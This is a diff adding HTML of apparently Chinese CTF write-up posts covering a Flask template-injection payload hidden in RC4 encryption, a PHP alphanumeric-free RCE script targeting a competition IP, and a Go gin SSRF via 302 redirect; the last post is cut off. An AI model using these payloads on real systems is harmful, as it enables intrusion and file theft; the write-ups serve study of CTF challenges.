@@ -159,6 +159,410 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/" class="post-title-link" itemprop="url">CISCN2019-华东南赛区-Double-Secret</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-14 14:28:06 / 修改时间：14:38:42" itemprop="dateCreated datePublished" datetime="2021-05-14T14:28:06+08:00">2021-05-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h3><p>Welcome To Find Secret</p>
+<p>记录一下……</p>
+<p>寻找secret……扫不出后台，robots页面似乎没什么用……</p>
+<p>尝试发现secret页面：</p>
+<img src="/images/CISCN2019-华东南赛区-Double-Secret/image-20210514143307636.png" alt="image-20210514143307636" style="zoom:80%;" />
+
+<p>提交参数secret：</p>
+<p>随便输入报错：</p>
+<img src="/images/CISCN2019-华东南赛区-Double-Secret/image-20210514143408872.png" alt="image-20210514143408872" style="zoom:80%;" />
+
+<p>rc4似乎是需要密钥的一种加密，猜测此处暴漏了密钥</p>
+<p>并且解密后进行模板渲染，flask，模板注入……</p>
+<p>记录下脚本与用法……本地报错，搞了好长时间，输出又不对</p>
+<p>拉到kali中，安装python3可以运行……很迷……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210514143837632.png" alt="image-20210514143837632"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/" class="post-title-link" itemprop="url">津门杯hate_php</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-12 20:59:43 / 修改时间：21:06:29" itemprop="dateCreated datePublished" datetime="2021-05-12T20:59:43+08:00">2021-05-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="津门杯hate-php"><a href="#津门杯hate-php" class="headerlink" title="津门杯hate_php"></a>津门杯hate_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>p神！</strong>：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<p>可以在res中看到php版本为5.x，这里就需要用到p神的php5下的上传临时文件+通配符RCE</p>
+<blockquote>
+<p>多过滤一个@，看着ascii往前换一个就行</p>
+</blockquote>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://122.112.214.101:20004/index.php?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url=url,files=files)</span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>有一定概率性……</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/" class="post-title-link" itemprop="url">津门杯GoOSS</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-12 19:51:48" itemprop="dateCreated datePublished" datetime="2021-05-12T19:51:48+08:00">2021-05-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-13 11:24:33" itemprop="dateModified" datetime="2021-05-13T11:24:33+08:00">2021-05-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="津门杯GoOSS"><a href="#津门杯GoOSS" class="headerlink" title="津门杯GoOSS"></a>津门杯GoOSS</h3><blockquote>
+<p>弄懂这道题花了我很长时间，期间走了很多弯路……（<strong>wotaicaile</strong></p>
+<p>在写这道题的路上，我学习(了解)了DNS绑定攻击、Google账号验证、免费域名注册(白嫖)、golang、搭建go环境、gin、dlv调试golang……</p>
+</blockquote>
+<h4 id="gin代码"><a href="#gin代码" class="headerlink" title="gin代码"></a>gin代码</h4><p>在go程序最前可以看到：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><code>&quot;github.com/gin-gonic/gin&quot;</code>既是gin框架，所以既要看得懂go，也要学看gin……</p>
+<p>路由：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.Use(fileMidderware)</span><br><span class="line">	r.POST(<span class="string">&quot;/vul&quot;</span>, vulController)</span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, uploadController)</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	_ = r.Run(<span class="string">&quot;:1234&quot;</span>) <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>r.Use(fileMidderware)</code>设置了全局中间件</p>
+<p><code>r.POST(&quot;/vul&quot;, vulController)</code>设置了对该路径请求的局部中间件</p>
+<p>vulController：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url Url</span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>捆绑url为json格式，post传参时需要传：<code>&#123;&quot;url&quot;:&quot;xxxx&quot;&#125;</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url, <span class="string">&quot;http://127.0.0.1:1234/&quot;</span>) &#123;</span><br><span class="line">		c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">	resp, err := client.Get(url.Url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>限制了内网访问的端口</p>
+<p>uploadController：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file File</span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;file); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dir := md5sum(file.Name)</span><br><span class="line"></span><br><span class="line">	_, err := http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		e := os.Mkdir(<span class="string">&quot;./files/&quot;</span>+dir, os.ModePerm)</span><br><span class="line">		_, _ = http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line">		<span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: e.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	filename := md5sum(file.Content)</span><br><span class="line">	path := <span class="string">&quot;./files/&quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename</span><br><span class="line">	err = ioutil.WriteFile(path, []<span class="keyword">byte</span>(file.Content), os.ModePerm)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file upload succ, path: &quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概是在files文件夹下上传文件的功能，当时尝试了下，似乎并不存在什么漏洞……</p>
+<p>fileMidderware:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMidderware</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	fileSystem := http.Dir(<span class="string">&quot;./files/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> c.Request.URL.String() == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">		c.Next()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	f, err := fileSystem.Open(c.Request.URL.String())</span><br><span class="line">	<span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Next()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Next()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	fi, err := f.Stat()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> fi.IsDir() &#123;</span><br><span class="line">		fmt.Println(c.Request.URL.String())</span><br><span class="line">		<span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">			fmt.Println(c.Request.URL.String())</span><br><span class="line">			c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">			fmt.Println(c.Request.URL.String())</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			files := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">			l, _ := f.Readdir(<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">for</span> _, i := <span class="keyword">range</span> l &#123;</span><br><span class="line">				files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;files&quot;</span>: files,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		data, _ := ioutil.ReadAll(f)</span><br><span class="line">		c.Header(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">`attachment; filename=`</span>+fi.Name())</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/plain&quot;</span>, data)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在/vul中请求<code>&#123;&quot;url&quot;:&quot;127.0.0.1:1234/../&quot;&#125;</code>:</p>
+<p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512201947610.png" alt="image-20210512201947610"></p>
+<p>访问到了上级files目录，不存在别的东西了……</p>
+<p>源码给了index.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line"></span><br><span class="line">readfile($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果能访问到80默认端口上的index并传参就可以获取flag</p>
+<h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">		<span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">			fmt.Println(c.Request.URL.String())</span><br><span class="line">			c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>关键是这里的代码……由于gin的配置，访问<code>xxx.xxx.xxx/haha</code>与<code>xxx.xxx.xxx/haha/</code>并不相同</p>
+<p><code>strings.HasSuffix</code>检测<code>c.Request.URL</code>是否以\结尾，若不是则加上并跳转。大概本意也许是想解决这个问题？(好像哪里又不大对)……</p>
+<p>配置好dlv调试代码服务：</p>
+<img src="/images/津门杯GoOSS/image-20210512203038285.png" alt="image-20210512203038285" style="zoom:80%;" />
+
+<p>c中含有request：</p>
+<img src="/images/津门杯GoOSS/image-20210512203334500.png" alt="image-20210512203334500" style="zoom:80%;" />
+
+<p>request中含有host和url，这里的url应该类似为资源文件？</p>
+<img src="/images/津门杯GoOSS/image-20210512204621788.png" alt="image-20210512204621788" style="zoom:80%;" />
+
+<p>如果我们传入：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.1:1234//1/..&quot;&#125;</code>：</p>
+<p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512203705614.png" alt="image-20210512203705614"></p>
+<p>网站尝试解析网址<strong>1</strong>……</p>
+<p>在不以<code>/</code>结尾的情况下，302跳转直接使用<strong>c.Request.URL</strong>进行跳转，类似加载外部js，拼接上<code>/</code>后，<code>//1/../</code>被认为是相对url并予以访问（大概），造成ssrf（应该）。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/5IcFhBKyk/">https://guokeya.github.io/post/5IcFhBKyk/</a></p>
+<p>大师傅说：</p>
+<p>Location可以控制为//，而//就是省略HTTP协议的写法，以作参考。</p>
+</blockquote>
+<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>我们现在能控制目标机访问外网，那怎么利用这一点呢……</p>
+<p>我们可以在自己的服务器写一个302跳转，使目标机访问后跳转到(目标机)本机的默认端口上并读取flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512205534307.png" alt="image-20210512205534307"></p>
+<p>获得flag！</p>
+<p>流程：</p>
+<p>访问/vul-》fileMidderware-》vulController-》<code>resp, err := client.Get(url.Url)</code>-》fileMidderware-》<strong>302跳转</strong>(c.Request.URL)-》服务器-》<strong>302跳转</strong>-》127.0.0.1/index.php?file=xxx-》flag</p>
+<blockquote>
+<p>总之还是搞了不少东西的，虽然有很多无用功，花了好几天，但也很增长知识。</p>
+<p>如果哪里我理解的不对希望能告诉我！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
